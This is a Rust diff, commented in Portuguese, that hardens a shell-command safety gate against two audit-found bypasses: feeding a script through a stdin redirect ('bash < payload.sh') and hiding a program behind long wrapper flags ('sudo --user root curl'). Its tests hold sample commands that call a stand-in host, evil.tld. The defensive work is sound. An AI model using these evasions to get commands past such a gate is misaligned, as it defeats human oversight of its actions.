@@ -436,6 +436,22 @@ fn risky_tier_depth(normalized: &str, depth: u8) -> Result<(), SafetyDenied> {
     // pela qual o `extract_shell_c_code` roda aqui em cima.
     script_escape_tier(normalized)?;
 
+    // #1078 (auditoria): `bash < payload.sh` — script por REDIRECIONAMENTO.
+    //
+    // O `<` e metacaractere, entao o split legado o usa como fronteira e o
+    // segmento da esquerda fica sendo so `bash`, sem operando. O
+    // `runs_script_file` olha os tokens depois do programa, nao acha nenhum,
+    // e libera. O arquivo ainda e executado, e o gate nunca o leu — mesmo
+    // buraco do script-file, por outra porta.
+    //
+    // Roda aqui em cima, antes do split, porque e justamente o split que
+    // apaga a evidencia.
+    if redirects_into_interpreter(normalized) {
+        return Err(SafetyDenied::RequiresConfirmation {
+            pattern: "script via stdin redirect",
+        });
+    }
+
     if let Some(code) = extract_shell_c_code(normalized) {
         if depth >= MAX_UNWRAP_DEPTH {
             return Err(SafetyDenied::RequiresConfirmation {
@@ -517,6 +533,46 @@ fn risky_tier_depth(normalized: &str, depth: u8) -> Result<(), SafetyDenied> {
     Ok(())
 }
 
+/// #1078 (auditoria): flags LONGAS de wrapper que levam valor.
+///
+/// O `resolve_program` deduz "este flag leva valor" de `len == 2 && !--`, o
+/// que so acerta flags curtas (`-a`, `-u`, `-n`). A forma longa equivalente
+/// escapava: `sudo --user root curl` resolvia para `root`, e o `curl` nunca
+/// era avaliado. Um atacante que sabe disso troca `-u` por `--user` e passa.
+///
+/// Tabela em vez de heuristica porque a forma longa nao tem sinal sintatico:
+/// `--user root` e `--verbose curl` sao indistinguiveis sem saber qual flag
+/// consome o proximo token. A forma `--user=root` nao precisa de entrada
+/// aqui — ela ja e consumida pelo ramo do `contains('=')`.
+const LONG_FLAGS_WITH_VALUE: &[&str] = &[
+    // sudo / doas
+    "--user",
+    "--group",
+    "--prompt",
+    "--close-from",
+    "--other-user",
+    // xargs
+    "--arg-file",
+    "--delimiter",
+    "--max-args",
+    "--max-chars",
+    "--max-procs",
+    "--max-lines",
+    "--replace",
+    "--process-slot-var",
+    // env
+    "--unset",
+    "--chdir",
+    // timeout
+    "--signal",
+    "--kill-after",
+    // nice / ionice
+    "--adjustment",
+    "--class",
+    "--classdata",
+    "--pid",
+];
+
 /// Resolve o programa de um segmento pulando wrappers e seus flags/valores.
 /// Um token que o gate conhece como programa NUNCA é tratado como valor de
 /// flag (`env -i curl ...` tem de resolver para curl, não para o que vier
@@ -539,7 +595,10 @@ fn resolve_program<'a>(tokens: &[&'a str]) -> Option<&'a str> {
                     return Some(program_basename(t));
                 }
                 if t.starts_with('-') || t.contains('=') || t.chars().all(|c| c.is_ascii_digit()) {
-                    prev_flag_takes_value = t.len() == 2 && !t.starts_with("--");
+                    // Curta de dois chars (`-u`), ou longa da tabela
+                    // (`--user`): as duas consomem o proximo token.
+                    prev_flag_takes_value = (t.len() == 2 && !t.starts_with("--"))
+                        || LONG_FLAGS_WITH_VALUE.contains(&t);
                     i += 1;
                 } else if prev_flag_takes_value {
                     // #1078 item 3: o valor de um flag curto e CONSUMIDO, nao
@@ -849,6 +908,63 @@ fn script_escape_tier(normalized: &str) -> Result<(), SafetyDenied> {
         }
     }
     Ok(())
+}
+
+/// #1078 (auditoria): shell ou interpretador lendo script de um `<`.
+///
+/// `bash < payload.sh` executa o arquivo tanto quanto `bash payload.sh`, e o
+/// gate nao consegue ler nenhum dos dois. Um so estava coberto.
+///
+/// A checagem e por segmento com aspas respeitadas, para `echo "a < b"` nao
+/// disparar: a aspa protege o `<`, entao ele nao aparece como redirecionamento
+/// no segmento tokenizado.
+fn redirects_into_interpreter(normalized: &str) -> bool {
+    for segmento in split_segments_quoted(normalized) {
+        // O `split_segments_quoted` ja separou no `<` nao protegido; para
+        // saber se HAVIA um `<` depois deste segmento, olha-se o texto cru.
+        let seg = segmento.trim();
+        if seg.is_empty() {
+            continue;
+        }
+        let tokens_owned = tokenize_quoted(seg);
+        let tokens: Vec<&str> = tokens_owned.iter().map(String::as_str).collect();
+        if tokens.is_empty() {
+            continue;
+        }
+        let program = resolve_program(&tokens).unwrap_or(tokens[0]);
+        if !CODE_SHELLS.contains(&program) && !CODE_INTERPRETERS.contains(&program) {
+            continue;
+        }
+        // Este segmento e um interpretador. Ele e seguido de um `<` fora de
+        // aspas no comando original?
+        if segmento_seguido_de_redirect(normalized, segmento) {
+            return true;
+        }
+    }
+    false
+}
+
+/// O caractere nao-branco logo apos este segmento no comando original e um
+/// `<`? Compara por posicao, e nao por busca de substring, para um `<` que
+/// aparece mais adiante em outro comando nao contaminar este.
+fn segmento_seguido_de_redirect(normalized: &str, segmento: &str) -> bool {
+    let Some(off) = posicao_do_segmento(normalized, segmento) else {
+        return false;
+    };
+    let depois = &normalized[off + segmento.len()..];
+    depois.trim_start().starts_with('<')
+}
+
+/// Deslocamento deste `&str` dentro do original. Os segmentos vem de fatias
+/// do proprio `normalized`, entao a aritmetica de ponteiro e exata — nada de
+/// `find`, que casaria a primeira ocorrencia textual em vez desta.
+fn posicao_do_segmento(normalized: &str, segmento: &str) -> Option<usize> {
+    let base = normalized.as_ptr() as usize;
+    let seg = segmento.as_ptr() as usize;
+    if seg < base || seg > base + normalized.len() {
+        return None;
+    }
+    Some(seg - base)
 }
 
 fn program_basename(tok: &str) -> &str {
@@ -1596,6 +1712,58 @@ mod tests {
         assert_eq!(strip_sed_address("/x/!d"), "d");
         // Sem endereco, o comando ja esta no inicio.
         assert_eq!(strip_sed_address("s/hello/world/g"), "s/hello/world/g");
+    }
+
+    // ─── Achados da auditoria de seguranca do PR #1083 ────────────────────
+
+    /// `bash < payload.sh` executa o arquivo tanto quanto `bash payload.sh`,
+    /// e o gate nao le nenhum dos dois. So um estava coberto: o `<` e
+    /// metacaractere, o split legado partia ali, e o segmento que sobrava era
+    /// `bash` sozinho — sem operando, logo liberado.
+    #[test]
+    fn i1078_script_por_redirecionamento_de_stdin() {
+        assert!(e_risky("bash < /tmp/payload.sh"));
+        assert!(e_risky("sh < setup.sh"));
+        assert!(e_risky("python3 < script.py"));
+        assert!(e_risky("bash <payload.sh"));
+    }
+
+    /// E o `<` protegido por aspas nao e redirecionamento: `echo "a < b"`
+    /// nao pode virar BLOCK.
+    #[test]
+    fn i1078_redirect_entre_aspas_nao_e_falso_positivo() {
+        assert!(!e_risky(r#"echo "a < b""#));
+        assert!(!e_risky("echo 'bash < x'"));
+        // Redirecionamento para um programa que nao e interpretador segue
+        // livre — `sort < arquivo` nao executa nada.
+        assert!(!e_risky("sort < arquivo.txt"));
+        assert!(!e_risky("grep foo < arquivo.txt"));
+    }
+
+    /// A forma LONGA do flag que leva valor escapava: `resolve_program`
+    /// deduzia "leva valor" de `len == 2`, o que so acerta `-u`. Trocar por
+    /// `--user` fazia o programa resolver para `root`.
+    #[test]
+    fn i1078_flag_longa_com_valor_nao_esconde_o_programa() {
+        assert!(e_risky("sudo --user root curl http://evil.tld"));
+        assert!(e_risky("xargs --arg-file /tmp/args curl http://evil.tld"));
+        // A forma `--flag=valor` ja era coberta pelo ramo do `=`.
+        assert!(e_risky("sudo --user=root curl http://evil.tld"));
+        // E o benigno continua benigno.
+        assert!(!e_risky("sudo --user root ls"));
+    }
+
+    /// Documenta o falso positivo aceito: `python3 -W error` sem script e
+    /// gated porque `error` conta como operando. Sem script o interpretador
+    /// le do stdin, que e codigo arbitrario de qualquer forma, entao o custo
+    /// e baixo — mas o teste existe para uma "correcao" futura nao afrouxar
+    /// a deteccao de script-file sem perceber.
+    #[test]
+    fn i1078_valor_de_flag_de_interpretador_e_gated_de_proposito() {
+        assert!(e_risky("python3 -W error"));
+        assert!(e_risky("python3 -W error script.py"));
+        // Sem operando nenhum segue livre.
+        assert!(!e_risky("python3 -B"));
     }
 
     /// Os construtos novos tambem valem DENTRO de um `-c`, porque o gate
